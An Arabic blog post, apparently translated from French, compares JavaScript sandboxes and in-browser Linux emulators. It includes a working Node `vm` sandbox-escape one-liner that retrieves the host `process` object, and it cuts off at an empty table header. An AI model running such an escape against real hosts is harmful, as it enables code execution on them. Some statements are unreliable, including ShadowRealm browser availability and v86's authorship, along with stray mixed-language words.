---
title: مقارنة حلول JavaScript لمحاكاة أنوية Linux
description: تحليل معمق لإعادات بناء بيئات Linux بـJavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "ESVuHq1yfpY676af2Tvs3BUc2wCiCoCOSsDQ+Jd3e8BON5tM3Tgh69zyLfdIVSEp+Fevo8ZwdUO/3pazacua5w=="
---

# كل sandbox في JavaScript ومحاكٍ ومحاكي Linux وhoneypot، مقارنة

حسنا، مر زمن طويل وأنا غارقة في جحر الأرنب هذا. بدأ كل شيء لأني كنت أساعد في [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)، مشروع Fortune (سأعود له بعد لحظة)، وكانوا يسألونني طوال الوقت "انتظر، ما الفرق مع `v86` ؟" أو "لماذا لا تستخدم `vm2` ؟"، وأدركت أنني لا أستطيع إعطاء جواب واضح دون رسم خريطة النظام البيئي كله أولا. إذن ها نحن، أظن.

تبين أن هناك أربع عائلات متميزة، عزل JS وLinux emulators وLinux simulators والـhoneypots، وهي بالكاد تتداخل أبدا، حتى لو ذُكرت باستمرار في نفس الجملة. من يبني نظام إضافات يستخدم `isolated-vm`. من يعرض أداة CLI يستخدم `v86`. من يجمع استخبارات تهديدات SSH يستخدم Cowrie. تحل مشاكل مختلفة تماما تحت نفس المظلة الغامضة "تشغيل كود في صندوق."

قضيت وقتا طويلا أقرأ كودا مصدريا وتقارير CVE ووثائق بنية وصفحات npm لكتابة هذا المقال. سيكون طويلا، احضر قهوة، جديا. أو اثنتين.

> تنبيه صغير : يبرز `typescript-virtual-container` في هذا المقال لأنه ما أشعل هذا البحث. حاولت الإنصاف مع الباقي، لكن ضع هذا السياق في ذهنك.

---

## الجزء 0، أولا : أي مشكلة تحلها فعلا ؟

قبل الغوص، يجدر التحديد الدقيق لفائدة كل عائلة، لأن المصطلحات تصبح فوضوية سريعا والناس يخلطون كل شيء باستمرار (وأنا منهم، قبل أن أجلس وأرسم كل شيء نظيفا).

**عزل JS** يعزل كود JavaScript عن عملية Node.js المضيفة. نموذج التهديد هو : كود JS غير موثوق قد يستدعي `process.exit()` أو يقرأ ملفات أو يطلق عمليات فرعية. الحل حد حول تنفيذ V8. لا مفهوم لهذه الأدوات لـshell في Linux أو نظام ملفات بأذونات أو SSH.

**محاكيات Linux** تشغّل نواة Linux حقيقية غير معدلة في محاكي CPU (x86 وRISC-V وOR1K) منفذ بـJavaScript أو WebAssembly. تقلع OS حقيقيا. لديك استدعاءات نظام حقيقية. لديك توافق ثنائي مع برامج مُجمَّعة لـx86. kost الموارد ضخم.

**محاكيات Linux السلوكية** تحاكي *سلوك* نظام Linux دون تشغيل نواة حقيقية. تنفذ مفسّر shell ونظام ملفات افتراضيا ودلالات Unix كافية لخداع البرامج والبشر. دون نواة ودون Wasm ودون محاكاة CPU. موارد أقل بكثير.

**الـhoneypots** مصممة لجذب المهاجمين وتسجيل ما يفعلونه. ليست أساسا بيئات تنفيذ، بل أدوات مراقبة. وفاء السلوك الحقيقي لـLinux لا يهم إلا بقدر ما يمنع المهاجم من كشف الفخ.

مع هذا الإطار، إليكم موضع كل مشروع في هذا المقال :

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Émulateur Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulateur Linux : typescript-virtual-container (وحيd في هذا الفضاء)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (ليس عازلا، لكن متصلا)
```

---

## الجزء 1، عزل JavaScript

### 1.1 `vm`، وحدة Node.js الأصلية (ليس ما تظن)

أقدم جواب لـ"تنفيذ JS غير موثوق" في Node هو وحدة `vm` الأصلية. موجودة منذ v0.1، لذا يستخدمها الكثيرون أولا، ويحترقون.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

ما تفعله `vm` فعلا : تنشئ سياق V8 جديدا (مجموعة جديدة من البناة الأصليين، `Object` و`Array` و`Function`، إلخ) وتنفذ كودا فيه، مع مرجع مشترك لما تضعه في `sandbox`. محرك V8 لا يتغير. عمليتك لا تتغير. الذاكرة مشتركة.

سبب عدم تقديم `vm` أي أمان : سلسلة نماذج JavaScript الأولية هي DAG يصل كل شيء بـ`Object.prototype`. إذا وضعت كائن عالم مضيف في العزل، يستطيع الضيف صعود سلسلة نماذجه والوصول لبناة المضيف. من `Function`، تستطيع استدعاء `Function("return process")()` واسترجاع `process` الحقيقي. انتهت اللعبة. فورا.

```js
// يعمل تماما في vm، تسترجع process الحقيقي
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

أعني، توثيق Node.js نفسه يقول : "وحدة vm ليست آلية أمان. لا تستخدموها لتنفيذ كود غير موثوق." هذا التحذير موجود دائما. يتجاهله الناس باستمرار. رأيت تطبيقات إنتاج تستخدم `vm` كعزل. من فضلك، لا تفعل ذلك.

**الحكم** : آلية نطاق، لا عزل. استخدمه عندما تحتاج عزل متغيرات (محركات قوالب ومزايا من نوع `eval` حيث تتحكم بالكود). أبدا لمدخلات غير موثوقة.

**الذاكرة** : عبء مهمل، نفس كومة V8 كعملية المضيف.
**الأمان** : لا شيء ضد مهاجم مصمم.

---

### 1.2 `vm2`، محاولة المجتمع وموته الطويل جدا

كانت `vm2` جواب المجتمع على مشكلة هروب `vm`. الفكرة المركزية : تغليف كل كائن يعبر حد العزل في `Proxy` يعترض الوصول للخصائص، ويحجب صعود النماذج، ويرشّح المراجع الخطيرة. فكرة ذكية نظريا ! عمليا، أثبتت النتيجة أنها أقل إقناعا بكثير، كما سنرى.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // يرمي VMError، فـprocess غير قابل للوصول
```

لعدة سنوات، عمل ذلك جيدا. لكن سطح هجوم `Proxy` في JavaScript ضخم. كل مزية لغة JS جديدة، مولدات ومتكررات غير متزامنة و`Symbol.toPrimitive` و`Error.prepareStackTrace` والمواقع الداخلية لـ`Promise`، هي ناقل التفاف محتمل.

التسلسل الزمني لـCVE هو... شيء ما. مثلا، انظر هذا :

| التاريخ | CVE | الآلية |
|------|-----|-----------|
| أكتوبر 2022 | CVE-2022-36067 | هروب سياق مضيف عبر `Error.prepareStackTrace` |
| أبريل 2023 | CVE-2023-29017 | تسرب كائن مضيف عبر خطأ async غير مُمسَك |
| أبريل 2023 | CVE-2023-29199 | التفاف تعقيم استثناءات عبر `handleException()` |
| أبريل 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` ← `Function` ← RCE |
| مايو 2023 | CVE-2023-32314 | `Proxy` على `Error.name` ← `Function` ← RCE |
| يوليو 2023 | CVE-2023-37466 | دالة async + فيض كومة + `Proxy.getPrototypeOf` |
| يوليو 2023 | CVE-2023-37903 | خيط worker + هروب eval |

ثلاث CVE حرجة في نفس الشهر (أبريل 2023). ثلاث. في شهر واحد. بعد CVE-2023-37903، أهمل المشرف رسميا المكتبة برسالة : *"تحوي المكتبة مشاكل أمنية حرجة ولا يجب استخدامها في الإنتاج."*

أحياها المشرف في أكتوبر 2025 مع الإصدار 3.10.0، مدعيا إصلاح كل ما كان معروفا آنذاك. كُشف هروب حرج جديد (CVE-2026-22709، CVSS 9.8) في يناير 2026، تلته دفعة أحد عشر أخرى في مايو 2026. أحد عشر. ولم يتغير النمط ولا أظنه سيتغير أبدا.

المشكلة الجوهرية بنيوية، وهذا هو الدرس الذي احتاج النظام البيئي كله وقتا لتعلمه. لا تستطيع بناء عزل آمن باستخدام نفس اللغة التي تعزلها، على نفس المحرك، في نفس العملية. سطح الهروب هو تنفيذ V8 كله، وV8 ملايين أسطر C++ تتغير باستمرار. كل مزية JS جديدة تفتح احتمالا طريق هجوم جديد.

**الحكم** : لا تستخدم لتطبيقات حساسة أمنيا. حتى على أحدث إصدار، تُكتشَف التفافات جديدة كل بضعة أشهر. وقد اعترف المشرف نفسه بذلك علنا.

---

### 1.3 `isolated-vm`، الذي يعمل فعلا

يتبنى `isolated-vm` المقاربة الصحيحة : استخدام بدائية عزل V8 الأصلية، Isolate. لكل Isolate في V8 كومته الخاصة وجامع قمامة خاص ومجموعة أصليين خاصة، وصفر مرجع مشترك مع Isolates الأخرى.

إنها نفس الحد الذي يستخدمه Chrome بين التبويبات. إنه حاجز أمان حقيقي، لا حيلة لغة مبنية على Proxy.

```js
import ivm from "isolated-vm";

// كل isolate كومة V8 خاصة به
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // حد MB
const context = await isolate.createContext();
const jail = context.global;

// تمرير بيانات عبر الحد يتطلب تسلسلا صريحا
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // لا يستطيع الوصول لعملية المضيف ولا كومته ولا وحداته
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// تستطيع الإنهاء بعنف عند مهلة أو حد ذاكرة
isolate.dispose(); // يحرر كومة الكل
```

أنواع `Reference` و`ExternalCopy` هي جسر التواصل الصريح. تعطي `Reference` للـisolate مقبضا قابلا للاستدعاء نحو دالة مضيف، يستطيع الـisolate استدعاءها لكن لا يستطيع فحص إغلاقها أو نموذجها. يسلّسل `ExternalCopy` قيمة (استنساخ منظم) عبر حد الكومة. نموذج الجسر الصريح هذا ليس عمليا، لكنه ما يجعل العزل حقيقيا.

تستطيع تعريف حدود موارد صارمة : ذاكرة (يُنهَى الـisolate إذا تجاوز الحد)، ومهلة ساعة حائط، ومهلة CPU. الإنهاء حقيقي، يقتل Isolate V8 كله، لا مجرد مهلة JS يمكن الالتفاف عليها مع `while(true)`.

**الحدود** : إنه JS فقط. لا تستطيع تنفيذ bash فيه. لا مفهوم لملفات أو أذونات أو شبكة أو عمليات. إنه بالضبط الأداة الصحيحة لـJS المقدم من مستخدم (إضافات وصيغ وخطافات سكربت)، والأداة الخطأ لكل الباقي. ذكرت كاتبة `typescript-virtual-container` أنها نظرت فيه في البداية قبل أن تدرك أن "تنفيذ أوامر shell" و"عزل JavaScript" مشكلتان مختلفتان جوهريا.

**الذاكرة** : ~3-10 Mo لكل isolate فارغ، تزيد مع استخدام الكومة.
**الأمان** : صلب. حد V8 Isolate هو بدائية العزل الحقيقية.
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten`، محرك JS منفصل مُجمَّع إلى Wasm

مقاربة مختلفة : بدلا من العزل في V8، تشغيل محرك JavaScript منفصل تماما مُجمَّع إلى WebAssembly. المضيف يعمل في V8/Node. والضيف يعمل في QuickJS-داخل-Wasm. يوفر عزل Wasm حد الفصل.

QuickJS ما زال من عمل Fabrice Bellard (نفس الرجل خلف QEMU وFFmpeg وJSLinux وTinyEMU، هذا الشخص ليس حقيقيا، جديا، كيف يفعل شخص واحد كل ذلك ؟). إنه محرك JS صغير متوافق مع معيار ES2023 مكتوب C، ومُجمَّعا إلى Wasm لا يتجاوز حوالي 500 Ko.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // يعمل في QuickJS، منفصل تماما عن V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS محرك JavaScript صغير متوافق مع ES2023 مكتوب C. مُجمَّعا إلى Wasm، يبلغ حوالي 500 Ko للصيغة المتزامنة، و~1 Mo للصيغة غير المتزامنة (Asyncify). إدارة الذاكرة يدوية، كل قيمة تستخرجها من VM يجب تحريرها صراحة، وهذا مزعج بعض الشيء لكنه يمنع مفاجآت GC عبر الحدود. مقايضة ممتعة !

يضيف الغلاف `@sebastianwessel/quickjs` واجهة أكثر راحة فوقه، مع نظام ملفات افتراضي اختياري ودعم fetch وبدائل وحدات Node.js :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

نموذج الأمان مختلف عن `isolated-vm` : نموذج الذاكرة الخطية في Wasm يجعل الضيف لا يستطيع الوصول مباشرة لكائنات كومة V8. سطح الهجوم هو واجهة مضيف↔Wasm (imports/exports)، لا لغة JS كلها. يُعتبر عموما أكثر متانة من العزل القائم على Proxy.

الوجه الآخر : QuickJS ليس بنفس مستوى تحسين V8. لأحمال JS المرتبطة بـCPU، هو أبطأ 5 إلى 20 مرة من V8. لقطع الكود الصغيرة والتقييمات غير الموثوقة، لا يهم ذلك عادة.

**الذاكرة** : ~500 Ko وحدة Wasm + كومة لكل نسخة.
**الأمان** : حد Wasm، يُعتبر أصلب من المقاربات القائمة على Proxy.
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) و[@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno، runtime يضع الأذونات أولا

يتبنى Deno فلسفة مختلفة تماما : بدلا من العزل في Node، بناء runtime جديد آمن افتراضيا. أحب هذه المقاربة فعلا، إنها ما كان يجب أن يكون عليه Node.js منذ البداية، بصراحة. أنشأ Ryan Dahl (مبتكر Node.js الأصلي) Deno حرفيا لأنه ندم على بعض قرارات تصميم Node.js، وهذا جنوني بعض الشيء عندما تفكر فيه.

كل قدرة حساسة (قراءة ملف وكتابة ملف وشبكة وبيئة وعمليات فرعية) تتطلب علما `--allow-*` صريحا :

```bash
# هذا يستطيع القراءة فقط في /data، لا شيء آخر
deno run --allow-read=/data script.ts

# هذا يستطيع الوصول فقط لنطاق واحد
deno run --allow-net=api.example.com script.ts

# دون أعلام = لا إذن
deno run untrusted.ts # لا يستطيع القراءة والكتابة والشبكة والإطلاق
```

نموذج الأذونات منفذ في مستوى Rust/OS، ليس حيلة JS. عندما يستدعي كود Deno دالة `Deno.readFile()`، يمر عبر عملية Rust تتحقق من جدول الأذونات قبل لمس نظام الملفات. لا تستطيع الالتفاف عليه من JS لأن استدعاء النظام لا يحدث أبدا إذا لم يُمنَح الإذن.

لتنفيذ كود غير موثوق فعلا، توفر Workers في Deno (Web Workers) عزلا ثانيا في نفس العملية، لكل واحد مجموعة أذوناته الخاصة. تستطيع إطلاق worker بصفر إذن والتواصل معه عبر `postMessage`.

أضاف Deno 2 (صادر في أكتوبر 2024) توافق npm كاملا وshims توافق Node.js، مما حسّن كثيرا اعتماده لحالات استخدام جهة الخادم.

**المقايضة** : نموذج أمان Deno ممتاز لكود قد تثق به جزئيا. لكود غير موثوق تماما قد يكون عدائيا، نموذج الأذونات لا يساعد، تحتاج حد Isolate (`isolated-vm`) أو محركا مختلفا (`quickjs-emscripten`)، لأن Deno يستخدم V8 دائما وقد يجد مهاجمون متطورون bugs في مستوى V8.

---

### 1.6 TC39 ShadowRealm، الجواب المعياري (يوما ما)

لدى هيئة تقييس JavaScript (TC39) اقتراح يسمى ShadowRealm يحاول تقييس ما حاولت `vm` و`vm2` فعله، لكن بنموذج أمان صحيح. ينشئ ShadowRealm سياق تنفيذ JS معزولا بأدواته الخاصة، دون وصول للعالم الخارجي، وواجهة استيراد/تصدير مضبوطة بعناية.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // أدوات منفصلة، دون وصول للعالم الخارجي
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm متاح في المتصفحات (Chrome 90+ وFirefox 105+) لكنه ليس بعد في Node.js المستقر في 2026. يبني اقتراح TC39 المسمى Compartments فوقه للعزل في مستوى الوحدات. إنها الأجوبة المعيارية طويلة المدى، لكنها ليست جاهزة بعد لإنتاج جهة خادم Node. إنه من تلك الأوراش التي تراها قادمة من بعيد لكن... ليست هنا بعد. كلاسيكية TC39 الكبرى.

---

### ملخص عائلة العزل

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **حد العزل** | لا شيء (نطاق) | Proxy (مكسور) | V8 Isolate | Wasm | V8 Isolate + أذونات Rust |
| **حد ذاكرة** | ❌ | ❌ | ✅ حد صارم | ✅ كومة Wasm | جزئي |
| **مهلة CPU** | ❌ | ✅ (قابل للالتفاف) | ✅ صارم | ✅ | ✅ |
| **الأمان** | لا شيء | مكسور | صلب | صلب | صلب |
| **سرعة JS** | V8 أصلي | V8 أصلي | V8 أصلي | ~10x أبطأ | V8 أصلي |
| **المتصفح** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **توافق Node** | أصلي | ✅ | ✅ | shims جزئية | جزئي |
| **الحالة** | مستقر | محفوف بالمخاطر (CVE جديدة) | ✅ نشط | ✅ نشط | ✅ نشط |
| **عبء RAM** | ~1 Mo | ~5-20 Mo | ~3-10 Mo | ~5-15 Mo | ~10-30 Mo |

الحكم : إذا كان الأمان يهمك، هناك بالضبط خياران حقيقيان، `isolated-vm` (امتداد أصلي وV8 Isolate وسرعة JS كاملة) و`quickjs-emscripten` (Wasm ومتوافق متصفح و~10x أبطأ للحساب المكثف). كل الباقي إما "من فضلك لا تفعل ذلك" (`vm` و`vm2`) أو runtime يحل مشكلة مختلفة تماما (Deno). قد يغيّر ShadowRealm قواعد اللعبة يوما، لكن ليس بعد.

---

## الجزء 2، محاكيات Linux في JavaScript

هنا تصبح الأمور مثيرة فعلا بالنسبة لي. هذه *محاكيات* حقيقية، تنفذ مجموعة تعليمات CPU بـJavaScript أو WebAssembly، وتقلع صورة نواة Linux حقيقية، وتنفذ ثنائيات مستخدم حقيقية. يأتي العزل من أن الضيف والمضيف لا يتشاركان شيئا : فضاءات ذاكرة مختلفة وتدفقات تعليمات مختلفة.

ثمن الدفع ضخم، لكن ما تحصل عليه رائع فعلا : Linux حقيقي، يعمل فعلا، في متصفحك أو عملية Node خاصتك. يعني، إنه جنوني بعض الشيء عندما تفكر فيه، أليس كذلك ؟

### 2.1 `v86`، محاكي PC بنظام x86 في JS + JIT مع Wasm

`v86` لـFabrice (copy على GitHub) هو أكثر محاكي x86 مفتوح المصدر قدرة بـJavaScript. بدأ كمفسّر JS خالص نحو 2013 وتطور نحو نظام JIT تُترجَم فيه كتل x86 الأساسية إلى WebAssembly لحظيا، محسّنا الأداء كثيرا.

ما يحاكيه :
- **CPU** : x86-32 (IA-32)، مجموعة تعليمات حوالي مستوى Pentium 1. يبقى 64-bit (x86-64) مستبعدا، إنه حد بنيوي في العتاد، لا مزية ناقصة.
- **FPU** : عبر `Float64Array` في JavaScript. x87 بدقة موسعة 80-bit ؛ وثنائيات JS بدقة 64-bit. يعني أن نتائج الفاصلة العائمة قد تختلف قليلا عن CPU حقيقي.
- **الذاكرة** : قابلة للضبط، تُرسَم نحو `SharedArrayBuffer` أو `ArrayBuffer` في كومة JS.
- **العتاد** : 8254 PIT (مؤقت) و8259 PIC (متحكم مقاطعات) ومتحكم لوحة مفاتيح 8042 (PS/2) وCMOS RTC وVGA مع امتدادات SVGA وBochs VBE ومتحكم IDE ومتحكم أقراص مرنة (8272A) وبطاقة شبكة NE2000.
- **BIOS** : يستخدم SeaBIOS (BIOS مفتوح المصدر لنظام x86).

يعمل JIT بتحديد الكتل الأساسية (تسلسلات تعليمات x86 دون قفزات)، وترجمتها إلى دالة WebAssembly، وتخزين هذه الدالة مؤقتا، واستدعائها عند التنفيذات التالية لنفس الكتلة. تحصل مسارات الكود الساخنة على أداء Wasm أصلي. وتسقط المسارات الباردة على مفسّر JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 Mo
  autostart: true,
});

// التقاط مخرجات التسلسل (طرفية نواة Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// إرسال مدخل للضيف (الكتابة في shell)
emulator.serial0_send("ls /\n");
```

**أنظمة مدعومة** : Alpine Linux (ممتاز) وUbuntu 16.04/18.04 (i386 فقط) وArch Linux 32 وReactOS وFreeDOS وWindows 9x/2000 (بتحفظات) وMS-DOS.

**زمن الإقلاع** : 15-40 ثانية لـAlpine Linux من صورة نظيفة. إنه متأصل في تهيئة النواة الحقيقية، لا تستطيع تخطيه. نعم، سيراقب مستخدموك نواة Linux تقلع في متصفحهم. هذا هو الاتفاق.

**ذاكرة دنيا** : 100-256 Mo لكل نسخة. وحده كاش كود Wasm الخاص بـJIT قد يبلغ عشرات Mo لنسخة Linux مشغولة.

**الاستخدام في Node.js** : مدعوم تماما. يبقى DOM زائدا، يمكن تجاهل مخرجات VGA إذا لم تكن تهتم إلا بمخرجات التسلسل.

**ما لا تستطيع فعله** : تنفيذ ثنائيات 64-bit، أو استخدام مزايا النواة الحديثة (eBPF وio_uring، إلخ)، أو تشغيل أكثر من حفنة نسخ متزامنة دون بلوغ حدود الذاكرة.

**npm** : [v86](https://www.npmjs.com/package/v86)، يُحدَّث باستمرار، آخر نشر في نفس اليوم لحظة كتابتي.
**GitHub** : [copy/v86](https://github.com/copy/v86)
**عرض** : [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux وTinyEMU، عمل Bellard، مرتين

JSLinux هو محاكي Linux الخاص بـFabrice Bellard في JavaScript، الأول على الإطلاق، منشور في 2011. أستمر في ذكر Bellard في هذا المقال لأنه لا يتوقف عن الظهور : QuickJS وTinyEMU وJSLinux وQEMU وFFmpeg. هذا الرجل شيء آخر. فعلا من أكثر المساهمات التقنية الفردية إثارة للإعجاب في تاريخ البرمجيات، دون مبالغة.

كان JSLinux الأصلي مفسّر x86 خالصا في JS. في 2016، كتب Bellard برنامج TinyEMU (محاكي RISC-V بلغة C)، وجمّعه إلى JavaScript عبر Emscripten، وصار هذا أساس JSLinux الحالي. إذن JSLinux الحالي هو في الواقع كود C يولّد JavaScript، ليس JS مكتوبا باليد إطلاقا.

تستحق الملاحظات التقنية على موقع Bellard القراءة : يشغّل JSLinux الحالي CPU من نوع RISC-V 32 أو 64-bit (لا x86)، محاكيا طرفية VirtIO وشبكة VirtIO وجهاز كتل VirtIO ونظام ملفات 9P لمشاركة الملفات مع المضيف. عرض JS مُجمَّع من C باستخدام Emscripten، ليس JS مكتوبا باليد.

يدعم TinyEMU نفسه :
- RISC-V RV32IMAFDQC وRV64IMAFDQC (32 و64-bit، مع فاصلة عائمة وضرب وتعليمات مضغوطة)
- x86 عبر KVM (أصلي فقط، لا محاكاة، إذن نسخة JS هي RISC-V فقط)
- طرفية VirtIO وشبكة وكتلة ومدخل ونظام ملفات 9P

لدى TinyEMU عرض JavaScript مقدم عبر Emscripten. إنه أساس JSLinux ويُستخدم أيضا في `container2wasm` (انظر القسم 2.5).

**حالة JSLinux** : لا حزمة npm، ولا API قابلة للبرمجة. إنه عرض تفتحه في متصفحك. الأهمية التاريخية كبيرة، فقد أثبت المفهوم. الفائدة العملية كمكتبة : معدومة.

**TinyEMU** : ليس على npm، ومصدر C متاح على [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k، محاكي OR1K

jor1k محاكي OpenRISC 1000 (OR1K) مكتوب JavaScript من Sebastian Macke. إنه مثير تاريخيا لأن jor1k أدخل دعم نظام ملفات VirtIO 9P، الذي دمجها Bellard بعد ذلك في TinyEMU وJSLinux. التلقيح المتبادل بين هذه المشاريع وثيق، يستعيرون كلهم أفكار بعضهم، وهذا بصراحة من أروع أشياء عمل المحاكاة مفتوح المصدر.

**الحالة** : لم يعد مصانا بنشاط، ولا حزمة npm. مؤرشف في هذه المرحلة. مفيد للمعرفة أساسا للسياق التاريخي، يعني إذا ذكر شخص jor1k في محادثة، تعرف الآن ما هو :)

---

### 2.4 CheerpX، محاكي x86 تجاري للمتصفح

CheerpX من Leaning Technologies هو محاكي Linux التجاري بنظام x86 بجودة إنتاج. ليس مفتوح المصدر، لكنه أقدر بكثير من v86 لتشغيل userspace حقيقي من Debian/Ubuntu. إذا احتجت VSCode حقيقي في المتصفح، فهذا ما يلزمك.

فروق أساسية مع v86 :
- يدعم ISA أوسع (امتدادات x86 أكثر وتوافق glibc أفضل)
- نظام ملفات قائم على IndexedDB في المتصفح (دائم بين إعادة تحميل الصفحة)
- دعم pthread عبر `SharedArrayBuffer` (الذي يتطلب ترويسات COOP/COEP، نعم ترويسات الأمان المزعجة تلك)
- مصمم لتشغيل VSCode وPython وNode.js وتطبيقات حقيقية أخرى، لا مجرد صور OS دنيا
- دعم احترافي وSLA متاح (أي تستطيع توبيخ شخص إذا انكسر)

حالة الاستخدام النموذجية هي "تشغيل تطبيق Linux حقيقي في المتصفح دون خادم." تستخدمه شركات لـIDE قائمة على متصفح ودروس برمجة وتوثيق تفاعلي.

```js
// واجهة CheerpX (مبسطة)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**التاريخ مع Node.js** : CheerpX مصمم أولا للمتصفح. قد يعمل المحاكي الكامن نظريا في Node (إنه Wasm)، لكن الواجهة والتوثيق موجهان تماما لاستخدام متصفح. الاستخدام جهة الخادم غير مدعوم.

**الذاكرة** : مشابهة لـv86، 200+ Mo لنسخة Debian حقيقية.
**التسعير** : مجاني للمشاريع مفتوحة المصدر، ورخصة تجارية لـSaaS في الإنتاج.
**وثائق** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz)، Node.js في Wasm، ليست محاكاة Linux

تُوضَع WebContainers غالبا في نفس سلة محاكيات Linux لكنها مختلفة بنيويا. لا تحاكي x86. ولا تقلع Linux. تشغّل Node.js مُجمَّعا إلى WebAssembly باستخدام WASI. هذا التمييز مهم كثيرا وقضيت وقتا أطول من اللازم مرتبكا بشأنه.

أظن أن اللبس يأتي من التسويق، "تشغيل Node.js في متصفحك" يشبه المحاكاة، لكنه في الواقع Node.js نفسه مُجمَّع إلى Wasm، لا محاكاة Linux تشغّل Node.js في VM. بنيتان مختلفتان تماما.

البنية :
1. Node.js مُجمَّع إلى Wasm (runtime مخصص WASI تحديدا)
2. Service Worker يعترض طلبات شبكة خادم Node.js المحاكى ويوجهها نحو تبويب المتصفح
3. نظام الملفات يعيش في ذاكرة المتصفح (لا إدخال/إخراج قرص)
4. npm تنفيذ مخصص مُحسَّن للاستخدام في المتصفح

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// كتابة ملفات
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// تنفيذ أوامر Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

وبما أنها تنفذ Node.js حقيقي (مُجمَّع إلى Wasm)، لديك npm حقيقي وواجهات Node.js حقيقية وحل وحدات حقيقي. وليس لديك userspace عام في Linux، لا تستطيع تثبيت حزم نظام مع `apt` أو تنفيذ ثنائيات مُجمَّعة اعتباطية أو فعل الكثير خارج نظام Node.js البيئي.

**متطلبات المتصفح** : SharedArrayBuffer (يتطلب ترويسات COOP/COEP) ودعم Service Worker وWasm حديث.

**التاريخ مع Node.js** : مصمم حصرا لاستخدام متصفح. لا تعمل الواجهة خارج سياق متصفح.

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**وثائق** : [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm، حاويات Docker مُجمَّعة إلى Wasm

`container2wasm` أداة (ليست حزمة npm) من NTT تأخذ صورة حاوية Docker وتحوّلها إلى ثنائي WebAssembly يستطيع العمل في أي مضيف Wasm، بما فيه متصفح. عندما رأيت ذلك أول مرة، لم أصدق فعلا أنه يعمل.

الآلية :
- للحاويات x86_64 : يضمّن Bochs (محاكي x86 مُجمَّع إلى Wasm) + نظام ملفات جذر الحاوية
- للحاويات riscv64 : يضمّن TinyEMU (Bellard مجددا !) + نظام ملفات جذر الحاوية
- ملف `.wasm` الناتج يقلع المحاكي، ويركّب نظام ملفات الحاوية، وينفذ نقطة دخول الحاوية

```bash
# تحويل حاوية Ubuntu 22.04 إلى Wasm
c2w ubuntu:22.04 out.wasm

# تنفيذها
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# أو تقديمها لاستخدام متصفح
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

ملف `.wasm` الناتج ضخم، Ubuntu دنيا تبلغ مئات Mo، لكنه مستقل تماما. تستطيع إرسال `.wasm` بالبريد لشخص فيستطيع تشغيل Ubuntu في متصفحه. هذه الجملة ما كان يجب أن يكون لها معنى لكن ها نحن.

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### ملخص عائلة المحاكيات

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
